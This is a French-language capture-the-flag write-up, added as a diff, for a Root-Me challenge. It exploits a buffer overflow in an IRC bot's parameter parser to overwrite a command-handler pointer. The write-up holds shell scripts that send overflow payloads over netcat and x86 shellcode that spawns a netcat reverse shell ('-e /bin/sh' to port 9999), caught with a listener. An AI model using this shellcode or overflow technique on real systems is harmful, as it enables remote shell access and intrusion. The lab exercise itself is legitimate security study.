@@ -1,0 +1,77 @@
+Pour cette exercice, nous avons un bot connectee a un serveur irc, notre but va donc etre d'exploiter une faille du bot afin de lui faire se connecter sur un port que nous aurons laisser ouvert, cela nous permettra d'obtenir un acces au shell en tant que root.
+
+Dans un premier temps, en regardant le code on s'apercoit que la faille la plus "simple" a exploiter est celle du next_param() :
+	static char *next_param(char *cmd, char **ptr)
+{
+	static char buff[MAX_CMD_LEN + 1] = {0};
+	int i;
+
+	for(i = 0; cmd[i] && cmd[i] != ' '; i++)
+	{
+		buff[i] = cmd[i];
+	}
+	buff[i++] = 0;
+	*ptr = cmd + i;
+
+	return buff;
+}
+On s'apercoit en regardant la memoire que les Handlers sont situees juste apres, on va donc pouvoir les exploiter.
+Un handler est associee a une commande IRC : PRIVMSG, JOIN, PING ..etc.
+L'idee sera donc d'overflow afin de remplacer un des handlers par le code ue nous voulons lancer, puis de le rappeler afin d'executer notre code.
+On vois dans le code que les handlers sont les suivants :
+void init_handlers(void)
+{
+	add_handler("376", end_list_handle);
+	add_handler("JOIN", join_handle);
+	add_handler("PRIVMSG", privmsg_handle);
+	add_handler("PING", ping_handle);
+}
+On va utiliser le handler 376.
+
+Afin de pouvoir utiliser ces failles, il va falloir que nous nous connection pour envoyer des messages a notre bot. Un simple script permet de le faire :
+USER="mel-mouk42"
+IRC_SERVER="irc.root-me.org"
+IRC_PORT="6667"
+CHANNEL="#root-me_challenge"
+DEST="Pown3dBot"
+(
+ echo NICK $USER
+ echo USER $USER $USER $USER :$USER
+ sleep 1
+ echo "JOIN $CHANNEL"
+ sleep 1
+ echo "PRIVMSG $DEST" :`python -c 'print "A" * 300'`
+ echo "QUIT"
+ ) | nc $IRC_SERVER $IRC_PORT
+
+On s'apercoit qu'avec ce simple buffer de A, le bot plante et la structure est bien ecrasee. Il faut maintenant chercher comment l'ecraser correctement pour inserer les donnees qui nous interessent.
+On va donc envoyer trois message privee :
+- on place l'adresse de data dans le handler_list[1] (data contient notre shell code)
+- on place privmsg sur dans le handler egalement
+- on envoi un message qui, grace aux deux actions precedentes, va lancer notre shell code
+
+
+USER="mel-mouk42"
+IRC_SERVER="irc.root-me.org"
+IRC_PORT="6667"
+CHANNEL="#root-me_challenge"
+DEST="Pown3dBot"
+MSG="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"
+(
+ echo NICK $USER
+ echo USER $USER $USER $USER :$USER
+ sleep 1
+ echo "JOIN $CHANNEL"
+ sleep 1
+ echo "PRIVMSG $DEST" :`python -c 'print "!" + "A" * 139 +  "\x99\xf7\xff\xbf" + "PRIVMSG\0"'` -> 1er message
+ sleep 1
+ echo "PRIVMSG $DEST" :`python -c 'print "!" + "B" * 103 + "PRIVMSG\0"'` -> 2eme message
+ sleep 1
+ echo "PRIVMSG $DEST" + $MSG -> 3eme message!
+ echo "QUIT"
+ ) | nc $IRC_SERVER $IRC_PORT
+
+ Lorsque l'on lance ce script il suffit de se mettre en ecoute sur le serveur :
+ nc -lvp 9999
+ un shell va se lancer et il nous suffit d'afficher le mdp.
+
